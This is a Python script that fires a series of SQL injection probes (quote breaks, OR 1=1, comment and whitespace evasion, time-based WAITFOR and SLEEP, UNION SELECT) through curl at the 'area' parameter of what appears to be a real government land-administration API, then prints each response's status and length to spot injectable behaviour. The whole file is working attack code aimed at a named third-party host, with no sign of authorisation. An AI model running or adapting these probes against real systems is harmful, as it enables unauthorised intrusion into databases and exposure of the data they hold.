import subprocess, time
url0='https://www.land.nat.gov.tw/Api/NewsIndexList'
variants=[
    ('baseline','area=101'),
    ('quote','area=101%27'),
    ('quote_and','area=101%27%20AND%201=1--'),
    ('quote_or','area=101%27%20OR%201=1--'),
    ('quote_sqli_error','area=101%27%20OR%201=1--%20'),
    ('numeric_or','area=101%20OR%201=1'),
    ('numeric_or2','area=101%20OR%201=2'),
    ('numeric_and1','area=101%20AND%201=1'),
    ('numeric_and2','area=101%20AND%201=2'),
    ('comment_or','area=101%20/**/OR/**/1=1'),
    ('comment_or2','area=101%20/**/OR/**/1=2'),
    ('newline_or','area=101%0aOR%0a1=1'),
    ('tab_or','area=101%09OR%091=2'),
    ('double_or','area=101%20%4f%52%201%3d1'),
    ('waitfor','area=101;WAITFOR%20DELAY%20%270:0:3%27'),
    ('sleep','area=101;%20SLEEP(3)'),
    ('union','area=101%20UNION%20SELECT%201,2'),
    ('paren','area=101)'),
    ('semicolon','area=101;'),
    ('long_num','area=999999999999'),
    ('neg_num','area=-1'),
    ('empty','area='),
    ('null','area=NULL'),
]
for name,q in variants:
    url=url0+'?'+q
    r=subprocess.run(['curl','-sS','-m','15','-A','Mozilla/5.0','-D','-','-o','/dev/null',url],capture_output=True,text=True)
    lines=r.stdout.splitlines()
    status=lines[0] if lines else 'NO_RESPONSE'
    cl=''
    for l in lines:
        if l.lower().startswith('content-length:'):
            cl=l.split(':',1)[1].strip()
    print(f'{name:20s} | {status:25s} | CL={cl:6s}')
    time.sleep(0.3)
